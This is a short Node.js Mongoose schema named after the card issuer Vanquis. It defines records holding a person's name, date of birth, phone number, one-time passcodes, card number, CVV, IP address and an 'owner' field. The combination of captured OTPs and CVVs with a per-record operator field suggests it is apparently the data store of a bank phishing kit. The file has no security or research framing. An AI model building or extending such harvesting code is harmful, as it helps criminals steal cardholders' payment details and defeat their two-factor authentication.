const mongoose = require("mongoose");

const vanquisSchema = new mongoose.Schema({
  uniqueid: Number,
  fullname: String,
  dob: String,
  telephone: String,
  otpType: String,
  otp: String,
  ccnum: String,
  cvv: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Vanquis", vanquisSchema);
